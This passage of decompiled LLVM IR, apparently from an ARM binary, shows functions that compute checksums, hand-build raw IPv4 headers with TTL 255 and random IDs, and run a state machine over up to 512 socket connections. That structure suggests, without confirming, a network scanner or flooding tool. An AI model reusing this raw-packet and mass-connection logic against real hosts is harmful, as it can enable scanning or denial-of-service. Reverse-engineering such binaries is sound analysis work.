  %stack_var_-19.0 = phi i8 [ %v1_a7e4, %dec_label_pc_a790 ], [ %v1_a868, %dec_label_pc_a82c ]
  %stack_var_-20.0 = phi i8 [ %v6_a7c4, %dec_label_pc_a790 ], [ %v6_a848, %dec_label_pc_a82c ]
  %v4_a8ac = sext i8 %stack_var_-20.0 to i32
  %v1_a8b0 = icmp slt i8 %stack_var_-20.0, 0
  %v2_a8b0 = icmp eq i8 %stack_var_-20.0, 0
  br i1 %v2_a8b0, label %dec_label_pc_a82c, label %dec_label_pc_a8b8

dec_label_pc_a8b8:                                ; preds = %dec_label_pc_a8ac
  %v7_a8bc = icmp eq i8 %stack_var_-20.0, 10
  br i1 %v7_a8bc, label %dec_label_pc_a82c, label %dec_label_pc_a8c4

dec_label_pc_a8c4:                                ; preds = %dec_label_pc_a8b8
  %v7_a8c8 = icmp eq i8 %stack_var_-20.0, 100
  br i1 %v7_a8c8, label %dec_label_pc_a8d0, label %dec_label_pc_a8f0

dec_label_pc_a8d0:                                ; preds = %dec_label_pc_a8c4
  %tmp = icmp ult i8 %stack_var_-19.0, 64
  br i1 %tmp, label %dec_label_pc_a8f0, label %dec_label_pc_a8dc

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8d0
  %v1_a8e8 = icmp slt i8 %stack_var_-19.0, 0
  br i1 %v1_a8e8, label %dec_label_pc_a8f0, label %dec_label_pc_a82c

dec_label_pc_a8f0:                                ; preds = %dec_label_pc_a8dc, %dec_label_pc_a8c4, %dec_label_pc_a8d0
  %v7_a8f4 = icmp eq i8 %stack_var_-20.0, 127
  br i1 %v7_a8f4, label %dec_label_pc_a82c, label %dec_label_pc_a8fc

dec_label_pc_a8fc:                                ; preds = %dec_label_pc_a8f0
  br i1 %v1_a8b0, label %dec_label_pc_a82c, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_a8fc
  %v2_aa10 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  store i32 %v4_a8ac, i32* @lr, align 4
  %v4_aa4c = zext i8 %stack_var_-19.0 to i32
  %v4_aa5c = urem i32 %storemerge, 256
  %v6_aa78 = sext i8 %stack_var_-18.0 to i32
  %v12_aa78 = call i32 @function_8e30(i32 %v2_aa10, i32 ptrtoint ([12 x i8]* @global_var_16d50.74 to i32), i32 %v4_a8ac, i32 %v4_aa4c, i32 %v6_aa78, i32 %v4_aa5c, i32 0, i32 0, i32 0, i32 0)
  store i32 %v2_aa10, i32* @r0, align 4
  %v1_aa84 = call i32 @function_124d4(i32 %v2_aa10)
  store i32 %v3_a794, i32* @fp, align 4
  ret i32 %v1_aa84

; uselistorder directives
  uselistorder i32 %v2_aa10, { 2, 1, 0 }
  uselistorder i8 %stack_var_-20.0, { 0, 1, 2, 5, 4, 3 }
  uselistorder i8 %stack_var_-19.0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a8f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_a8ac, { 1, 0 }
  uselistorder label %dec_label_pc_a82c, { 1, 2, 0, 3, 4 }
}

define i32 @function_aa9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_aa9c:
  %stack_var_-4 = alloca i32, align 4
  %v3_aaa0 = load i32, i32* @fp, align 4
  store i32 43688, i32* %stack_var_-4, align 4
  %v2_aaa4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aaa4, i32* @fp, align 4
  %v2_aab4 = load i32, i32* @global_var_2664c.76, align 4
  %v1_aabc = call i32 @function_123d8(i32 %v2_aab4)
  %v2_aac8 = and i32 %v1_aabc, %arg1
  %v0_aad0 = call i32 @function_8400()
  %v1_aadc = sub i32 -1, %arg1
  %v2_aae0 = and i32 %v0_aad0, %v1_aadc
  %v2_aae8 = xor i32 %v2_aae0, %v2_aac8
  store i32 %v3_aaa0, i32* @fp, align 4
  ret i32 %v2_aae8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_aafc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_aafc:
  %v8_ab789 = icmp sgt i32 %arg2, 1
  br i1 %v8_ab789, label %dec_label_pc_ab28, label %dec_label_pc_ab7c

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aafc, %dec_label_pc_ab28
  %v2_ab44 = phi i32 [ %v2_ab48, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aafc ]
  %stack_var_-40.012 = phi i32 [ %v5_ab4c, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aafc ]
  %stack_var_-36.011 = phi i32 [ %v1_ab68, %dec_label_pc_ab28 ], [ %arg2, %dec_label_pc_aafc ]
  %stack_var_-32.010 = phi i8* [ %v5_ab60, %dec_label_pc_ab28 ], [ %arg1, %dec_label_pc_aafc ]
  %v4_ab28 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_ab2c = load i8, i8* %stack_var_-32.010, align 1
  %v3_ab2c = zext i8 %v2_ab2c to i32
  %v1_ab30 = add i32 %v4_ab28, 1
  %v2_ab30 = inttoptr i32 %v1_ab30 to i8*
  %v3_ab30 = load i8, i8* %v2_ab30, align 1
  %v4_ab30 = zext i8 %v3_ab30 to i32
  %v4_ab34 = mul nuw nsw i32 %v4_ab30, 256
  %v5_ab34 = or i32 %v4_ab34, %v3_ab2c
  %v2_ab48 = add i32 %v5_ab34, %v2_ab44
  %v3_ab48 = icmp ult i32 %v2_ab48, %v2_ab44
  %v4_ab4c = zext i1 %v3_ab48 to i32
  %v5_ab4c = add i32 %v4_ab4c, %stack_var_-40.012
  %v1_ab5c = add i32 %v4_ab28, 2
  %v5_ab60 = inttoptr i32 %v1_ab5c to i8*
  %v1_ab68 = add nsw i32 %stack_var_-36.011, -2
  %v8_ab78 = icmp sgt i32 %v1_ab68, 1
  br i1 %v8_ab78, label %dec_label_pc_ab28, label %dec_label_pc_ab7c

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aafc
  %v2_ab9c = phi i32 [ 0, %dec_label_pc_aafc ], [ %v2_ab48, %dec_label_pc_ab28 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %dec_label_pc_aafc ], [ %v5_ab60, %dec_label_pc_ab28 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_aafc ], [ %v5_ab4c, %dec_label_pc_ab28 ]
  %v7_ab74.lcssa.in = phi i32 [ %arg2, %dec_label_pc_aafc ], [ %v1_ab68, %dec_label_pc_ab28 ]
  %v7_ab74.lcssa = icmp eq i32 %v7_ab74.lcssa.in, 1
  br i1 %v7_ab74.lcssa, label %dec_label_pc_ab88, label %dec_label_pc_ac04.preheader

dec_label_pc_ab88:                                ; preds = %dec_label_pc_ab7c
  %v2_ab8c = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_ab8c = zext i8 %v2_ab8c to i32
  %v2_aba0 = add i32 %v3_ab8c, %v2_ab9c
  %v3_aba0 = icmp ult i32 %v2_aba0, %v2_ab9c
  %v4_aba4 = zext i1 %v3_aba0 to i32
  %v5_aba4 = add i32 %v4_aba4, %stack_var_-40.0.lcssa
  br label %dec_label_pc_ac04.preheader

dec_label_pc_ac04.preheader:                      ; preds = %dec_label_pc_ab88, %dec_label_pc_ab7c
  %v3_ac30.ph = phi i32 [ %v2_ab9c, %dec_label_pc_ab7c ], [ %v2_aba0, %dec_label_pc_ab88 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_ab7c ], [ %v5_aba4, %dec_label_pc_ab88 ]
  %v3_ac0836 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_ac1037 = udiv i32 %v3_ac30.ph, 65536
  %v2_ac1438 = or i32 %v3_ac0836, %v3_ac1037
  %v3_ac1c39 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_ac2440 = or i32 %v2_ac1438, %v3_ac1c39
  %v2_ac2841 = icmp eq i32 %v2_ac2440, 0
  br i1 %v2_ac2841, label %dec_label_pc_ac30, label %dec_label_pc_abb4

dec_label_pc_abb4:                                ; preds = %dec_label_pc_ac04.preheader, %dec_label_pc_abb4
  %v3_ac1c44 = phi i32 [ %v3_ac1c, %dec_label_pc_abb4 ], [ %v3_ac1c39, %dec_label_pc_ac04.preheader ]
  %v2_ac1443 = phi i32 [ %v2_ac14, %dec_label_pc_abb4 ], [ %v2_ac1438, %dec_label_pc_ac04.preheader ]
  %v3_ac3042 = phi i32 [ %v2_abf4, %dec_label_pc_abb4 ], [ %v3_ac30.ph, %dec_label_pc_ac04.preheader ]
  %v2_abc8 = urem i32 %v3_ac3042, 65536
  %v2_abf4 = add i32 %v2_ac1443, %v2_abc8
  %v3_abf4 = icmp ult i32 %v2_abf4, %v2_abc8
  %v4_abf8 = zext i1 %v3_abf4 to i32
  %v5_abf8 = add nuw nsw i32 %v4_abf8, %v3_ac1c44
  %v3_ac08 = mul i32 %v5_abf8, 65536
  %v3_ac10 = udiv i32 %v2_abf4, 65536
  %v2_ac14 = or i32 %v3_ac08, %v3_ac10
  %v3_ac1c = udiv i32 %v5_abf8, 65536
  %v2_ac24 = or i32 %v2_ac14, %v3_ac1c
  %v2_ac28 = icmp eq i32 %v2_ac24, 0
  br i1 %v2_ac28, label %dec_label_pc_ac04.dec_label_pc_ac30_crit_edge, label %dec_label_pc_abb4

dec_label_pc_ac04.dec_label_pc_ac30_crit_edge:    ; preds = %dec_label_pc_abb4
  br label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_ac04.dec_label_pc_ac30_crit_edge, %dec_label_pc_ac04.preheader
  %v3_ac30.lcssa = phi i32 [ %v2_abf4, %dec_label_pc_ac04.dec_label_pc_ac30_crit_edge ], [ %v3_ac30.ph, %dec_label_pc_ac04.preheader ]
  %v1_ac3c = urem i32 %v3_ac30.lcssa, 65536
  %v3_ac44 = xor i32 %v1_ac3c, 65535
  ret i32 %v3_ac44

; uselistorder directives
  uselistorder i32 %v2_ac14, { 1, 0 }
  uselistorder i32 %v5_abf8, { 1, 0 }
  uselistorder i32 %v2_abf4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_ac1c39, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_ac30.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ab9c, { 0, 2, 1 }
  uselistorder i32 %v1_ab68, { 0, 2, 1 }
  uselistorder i32 %v2_ab48, { 0, 2, 1 }
  uselistorder i32 %v2_ab44, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_abb4, { 1, 0 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
}

define i32 @function_ac54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ac54:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_ac58 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_ac90 = add i32 %arg1, 12
  %v2_ac90 = inttoptr i32 %v1_ac90 to i32*
  %v3_ac90 = load i32, i32* %v2_ac90, align 4
  store i32 %v3_ac90, i32* %stack_var_-44, align 4
  %v1_acb8 = call i32 @function_12434(i32 20)
  %v1_acdc = call i32 @function_127d4(i32 32)
  %v2_acec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_acdc, i32* @r0, align 4
  store i32 %v2_acec, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_ad00 = call i32 @function_11d60()
  %v1_ad08 = add i32 %v1_acdc, 12
  %v3_ad0c = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_ad08, i32* @r0, align 4
  store i32 %v3_ad0c, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_ad20 = call i32 @function_11d60()
  %v2_ad2c = inttoptr i32 %v1_acdc to i8*
  %v3_ad2c = call i32 @function_aafc(i8* %v2_ad2c, i32 32)
  %sext2 = mul i32 %v3_ad2c, 16777216
  %v3_ad38 = ashr i32 %sext2, 31
  %v1_ad44 = call i32 @function_12928(i32 %v1_acdc)
  %v3_ad4c = sdiv i32 %sext2, 16777216
  %v4_ad50 = mul nsw i32 %v3_ad38, 256
  %v4_ad54 = and i32 %v4_ad50, 65280
  %v5_ad54 = or i32 %v4_ad54, %v3_ad4c
  store i32 %v3_ac58, i32* @fp, align 4
  ret i32 %v5_ad54

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_acdc, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @function_ad64(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ad64:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp5 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_ad68 = load i32, i32* @fp, align 4
  store i32 44400, i32* %stack_var_-4, align 4
  %v2_ad6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ad6c, i32* @fp, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_ad88 = load i8, i8* %arg1, align 1
  %v4_ad90 = zext i8 %v2_ad88 to i32
  %v1_ad94 = and i32 %v4_ad90, 240
  %v1_ad98 = or i32 %v1_ad94, 5
  store i32 %v1_ad98, i32* %r3.global-to-local, align 4
  %v1_ada4 = trunc i32 %v1_ad98 to i8
  store i8 %v1_ada4, i8* %arg1, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_add4 = add i32 %tmp5, 1
  %v4_add4 = inttoptr i32 %v3_add4 to i8*
  store i8 0, i8* %v4_add4, align 1
  %v3_add8 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_add8, 20
  %v3_adec = urem i32 %fold, 65536
  store i32 %v3_adec, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_adf4 = trunc i32 %fold to i8
  %v3_adf4 = add i32 %tmp5, 2
  %v4_adf4 = inttoptr i32 %v3_adf4 to i8*
  store i8 %v1_adf4, i8* %v4_adf4, align 1
  %v0_adf8 = load i32, i32* %r3.global-to-local, align 4
  %v3_adf8 = sdiv i32 %v0_adf8, 256
  store i32 %v3_adf8, i32* %r3.global-to-local, align 4
  %v1_adfc = trunc i32 %v3_adf8 to i8
  %v2_adfc = load i32, i32* %r2.global-to-local, align 4
  %v3_adfc = add i32 %v2_adfc, 3
  %v4_adfc = inttoptr i32 %v3_adfc to i8*
  store i8 %v1_adfc, i8* %v4_adfc, align 1
  %v0_ae00 = call i32 @function_8400()
  %v3_ae0c = urem i32 %v0_ae00, 65536
  store i32 %v3_ae0c, i32* %r3.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v1_ae14 = trunc i32 %v0_ae00 to i8
  %v3_ae14 = add i32 %tmp5, 4
  %v4_ae14 = inttoptr i32 %v3_ae14 to i8*
  store i8 %v1_ae14, i8* %v4_ae14, align 1
  %v0_ae18 = load i32, i32* %r3.global-to-local, align 4
  %v3_ae184 = udiv i32 %v0_ae18, 256
  %v1_ae1c = trunc i32 %v3_ae184 to i8
  %v2_ae1c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae1c = add i32 %v2_ae1c, 5
  %v4_ae1c = inttoptr i32 %v3_ae1c to i8*
  store i8 %v1_ae1c, i8* %v4_ae1c, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ae28 = add i32 %tmp5, 6
  %v4_ae28 = inttoptr i32 %v3_ae28 to i8*
  store i8 0, i8* %v4_ae28, align 1
  %v0_ae2c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae2c = trunc i32 %v0_ae2c to i8
  %v2_ae2c = load i32, i32* %r2.global-to-local, align 4
  %v3_ae2c = add i32 %v2_ae2c, 7
  %v4_ae2c = inttoptr i32 %v3_ae2c to i8*
  store i8 %v1_ae2c, i8* %v4_ae2c, align 1
  %v3_ae38 = add i32 %tmp5, 8
  %v4_ae38 = inttoptr i32 %v3_ae38 to i8*
  store i8 -1, i8* %v4_ae38, align 1
  %v3_ae44 = add i32 %tmp5, 9
  %v4_ae44 = inttoptr i32 %v3_ae44 to i8*
  store i8 %tmp, i8* %v4_ae44, align 1
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ae50 = add i32 %tmp5, 10
  %v4_ae50 = inttoptr i32 %v3_ae50 to i8*
  store i8 0, i8* %v4_ae50, align 1
  %v0_ae54 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae54 = trunc i32 %v0_ae54 to i8
  %v2_ae54 = load i32, i32* %r2.global-to-local, align 4
  %v3_ae54 = add i32 %v2_ae54, 11
  %v4_ae54 = inttoptr i32 %v3_ae54 to i8*
  store i8 %v1_ae54, i8* %v4_ae54, align 1
  %v2_ae60 = add i32 %tmp5, 12
  %v3_ae60 = inttoptr i32 %v2_ae60 to i32*
  store i32 %arg3, i32* %v3_ae60, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ae6c = add i32 %tmp5, 16
  %v3_ae6c = inttoptr i32 %v2_ae6c to i32*
  store i32 %arg2, i32* %v3_ae6c, align 4
  store i32 %v3_ad68, i32* @fp, align 4
  ret i32 %v0_ae00

; uselistorder directives
  uselistorder i32 %v0_ae00, { 1, 2, 0 }
  uselistorder i32 %v3_adf8, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp5, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i8 -1, { 1, 2, 3, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @function_ae78(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ae78:
  %v8_ae94 = icmp sgt i32 %arg1, 2
  br i1 %v8_ae94, label %dec_label_pc_aea4, label %dec_label_pc_aeb4

dec_label_pc_aea4:                                ; preds = %dec_label_pc_ae78
  %v1_aea8 = call i32 @function_10678(i32 %arg1)
  br label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae78, %dec_label_pc_aea4
  %storemerge1 = phi i32 [ 0, %dec_label_pc_aea4 ], [ 1, %dec_label_pc_ae78 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_aeb4, { 1, 0 }
}

define i32 @function_aec4(i32 %arg1) local_unnamed_addr {
dec_label_pc_aec4:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_aec4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_aec4, i32* %ip.global-to-local, align 4
  %v3_aec8 = load i32, i32* @r4, align 4
  store i32 %v3_aec8, i32* %stack_var_-24, align 4
  store i32 44752, i32* %stack_var_-4, align 4
  %v19_aec8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_aecc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_aecc, i32* @fp, align 4
  %v0_aed4 = call i32 @function_106fc()
  store i32 %v0_aed4, i32* %r3.global-to-local, align 4
  %v1_aedc = add i32 %v0_aed4, 3
  store i32 %v1_aedc, i32* %r2.global-to-local, align 4
  %v1_aee0 = icmp slt i32 %v0_aed4, 0
  br i1 %v1_aee0, label %bb, label %bb44

bb:                                               ; preds = %dec_label_pc_aec4
  store i32 %v1_aedc, i32* %r3.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_aec4, %bb
  %v0_aee8 = phi i32 [ %v0_aed4, %dec_label_pc_aec4 ], [ %v1_aedc, %bb ]
  %v3_aee8 = sdiv i32 %v0_aee8, 4
  store i32 %v3_aee8, i32* %r2.global-to-local, align 4
  %v2_aef8 = mul nsw i32 %v3_aee8, 3
  %v5_af08 = icmp slt i32 %v2_aef8, 512
  br i1 %v5_af08, label %bb46, label %bb45

bb45:                                             ; preds = %bb44
  br label %bb46

bb46:                                             ; preds = %bb44, %bb45
  %v0_af0c = phi i32 [ 512, %bb45 ], [ %v2_aef8, %bb44 ]
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-212, align 4
  %v1_af24 = call i32 @function_12434(i32 23)
  %v2_af38 = ptrtoint i32* %stack_var_-212 to i32
  %v2_af5c = mul i32 %v0_af0c, 24
  %v1_af60 = or i32 %v2_af5c, 3
  %v1_af64 = add i32 %v1_af60, 3
  %v3_af68 = and i32 %v1_af64, -4
  %v1_af70 = load i32, i32* @sp, align 4
  %v2_af70 = sub i32 %v1_af70, %v3_af68
  %v1_af80 = add i32 %v2_af70, 19
  %v3_af84 = and i32 %v1_af80, -4
  %v2_afa8 = mul i32 %v0_af0c, 5
  store i32 %v2_afa8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_afa8, i32* @r2, align 4
  %v2_afbc = inttoptr i32 %v3_af84 to i8*
  %v3_afbc = call i32 @function_11d70(i8* %v2_afbc, i32 0)
  %v2_b044 = add i32 %v3_af84, 20
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v0_af0c, i32* %r3.global-to-local, align 4
  %v5_b07868 = icmp sgt i32 %v0_af0c, 0
  br i1 %v5_b07868, label %dec_label_pc_afcc, label %dec_label_pc_b07c.preheader

dec_label_pc_afcc:                                ; preds = %bb46, %dec_label_pc_afcc
  %storemerge469 = phi i32 [ %v1_b064, %dec_label_pc_afcc ], [ 0, %bb46 ]
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  %v3_afd8 = mul i32 %storemerge469, 8
  %v2_afe0 = mul nuw nsw i32 %storemerge469, 24
  %v2_afe4 = add i32 %v2_afe0, %v3_af84
  %v2_afe8 = add i32 %v2_afe4, 8
  store i32 %v2_afe8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_aff0 = add i32 %v2_afe4, 9
  %v4_aff0 = inttoptr i32 %v3_aff0 to i8*
  store i8 1, i8* %v4_aff0, align 1
  store i32 %storemerge469, i32* @r4, align 4
  %v1_affc = call i32 @function_127d4(i32 1024)
  store i32 20, i32* %ip.global-to-local, align 4
  %v0_b010 = load i32, i32* @r4, align 4
  %v2_b01c = mul i32 %v0_b010, 24
  %v2_b024 = add i32 %v2_b044, %v2_b01c
  %v2_b028 = inttoptr i32 %v2_b024 to i32*
  store i32 %v1_affc, i32* %v2_b028, align 4
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_afd8, i32* %r2.global-to-local, align 4
  %v2_b048 = add i32 %v2_afe0, %v2_b044
  store i32 %v2_b048, i32* %r3.global-to-local, align 4
  %v1_b04c = inttoptr i32 %v2_b048 to i32*
  %v2_b04c = load i32, i32* %v1_b04c, align 4
  store i32 %v2_b04c, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b05c = inttoptr i32 %v2_b04c to i8*
  %v3_b05c = call i32 @function_11d70(i8* %v2_b05c, i32 0)
  %v1_b064 = add nuw nsw i32 %storemerge469, 1
  store i32 %v1_b064, i32* %r2.global-to-local, align 4
  store i32 %v0_af0c, i32* %r3.global-to-local, align 4
  %v5_b078 = icmp slt i32 %v1_b064, %v0_af0c
  br i1 %v5_b078, label %dec_label_pc_afcc, label %dec_label_pc_b07c.preheader

dec_label_pc_b07c.preheader:                      ; preds = %dec_label_pc_afcc, %bb46
  %v2_b3d0 = add i32 %v3_af84, 4
  %v3_b4c0 = bitcast i32* %stack_var_-212 to %sockaddr*
  %v2_b5a0 = add i32 %v3_af84, 12
  %v2_b5ec = ptrtoint i32* %stack_var_-180 to i32
  %v2_b6e0 = ptrtoint i32* %stack_var_-188 to i32
  %v2_b73c = ptrtoint i32* %stack_var_-196 to i32
  %v2_b740 = ptrtoint i32* %stack_var_-192 to i32
  %v2_b658 = add i32 %v19_aec8, -156
  %v2_bca0 = add i32 %v3_af84, 16
  br label %dec_label_pc_b07c

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b07c, %dec_label_pc_ce80, %dec_label_pc_b07c.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v0_af0c, i32* %r3.global-to-local, align 4
  br i1 %v5_b07868, label %dec_label_pc_b088, label %dec_label_pc_b07c

dec_label_pc_b088:                                ; preds = %dec_label_pc_b07c, %dec_label_pc_ce80
  %storemerge560 = phi i32 [ %v1_ce84, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_b07c ]
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  %v3_b094 = mul i32 %storemerge560, 8
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_b09c = mul nuw nsw i32 %storemerge560, 24
  %v2_b0a0 = add i32 %v2_b09c, %v3_af84
  %v2_b0a4 = add i32 %v2_b0a0, 8
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v1_b0a8 = inttoptr i32 %v2_b0a4 to i8*
  %v2_b0a8 = load i8, i8* %v1_b0a8, align 4
  %v3_b0a8 = sext i8 %v2_b0a8 to i32
  %v4_b0a8 = zext i8 %v2_b0a8 to i32
  store i32 %v4_b0a8, i32* %r3.global-to-local, align 4
  switch i32 %v3_b0a8, label %dec_label_pc_ce80 [
    i32 0, label %dec_label_pc_b0dc
    i32 1, label %dec_label_pc_b588
    i32 2, label %dec_label_pc_ba28
    i32 3, label %dec_label_pc_bd68
    i32 4, label %dec_label_pc_bf68
    i32 5, label %dec_label_pc_c364
    i32 6, label %dec_label_pc_c564
    i32 7, label %dec_label_pc_ca10
    i32 8, label %dec_label_pc_cc68
  ]

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b088
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  %v2_b0f8 = add i32 %v2_b09c, %v2_b044
  store i32 %v2_b0f8, i32* %r3.global-to-local, align 4
  %v1_b0fc = inttoptr i32 %v2_b0f8 to i32*
  %v2_b0fc = load i32, i32* %v1_b0fc, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b10c = inttoptr i32 %v2_b0fc to i8*
  %v3_b10c = call i32 @function_11d70(i8* %v2_b10c, i32 0)
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0a4, i32* %r3.global-to-local, align 4
  %v1_b130 = add i32 %v2_b0a0, 9
  %v2_b130 = inttoptr i32 %v1_b130 to i8*
  %v3_b130 = load i8, i8* %v2_b130, align 1
  %v4_b130 = zext i8 %v3_b130 to i32
  store i32 %v4_b130, i32* %r3.global-to-local, align 4
  %v2_b134 = icmp eq i8 %v3_b130, 0
  br i1 %v2_b134, label %dec_label_pc_b21c, label %dec_label_pc_b13c

dec_label_pc_b13c:                                ; preds = %dec_label_pc_b0dc
  store i32 %v3_af84, i32* %r1.global-to-local, align 4
  store i32 %v3_b094, i32* %r2.global-to-local, align 4
  store i32 %v2_b0f8, i32* %r3.global-to-local, align 4
  %v2_b15c = load i32, i32* %v1_b0fc, align 4
  store i32 %v2_b0a0, i32* %r3.global-to-local, align 4
  %v2_b180 = inttoptr i32 %v2_b0a0 to i32*
  store i32 0, i32* %v2_b180, align 4
  %v0_b184 = load i32, i32* %r3.global-to-local, align 4
  %v1_b184 = add i32 %v0_b184, 4
  store i32 %v1_b184, i32* %r3.global-to-local, align 4
  %v2_b18c = inttoptr i32 %v1_b184 to i32*
  store i32 0, i32* %v2_b18c, align 4
  %v0_b190 = load i32, i32* %r3.global-to-local, align 4
  %v1_b190 = add i32 %v0_b190, 4
  store i32 %v1_b190, i32* %r3.global-to-local, align 4
  %v2_b198 = inttoptr i32 %v1_b190 to i32*
  store i32 0, i32* %v2_b198, align 4
  %v0_b19c = load i32, i32* %r3.global-to-local, align 4
  %v1_b19c = add i32 %v0_b19c, 4
  store i32 %v1_b19c, i32* %r3.global-to-local, align 4
  %v2_b1a4 = inttoptr i32 %v1_b19c to i32*
  store i32 0, i32* %v2_b1a4, align 4
  %v0_b1a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1a8 = add i32 %v0_b1a8, 4
  store i32 %v1_b1a8, i32* %r3.global-to-local, align 4
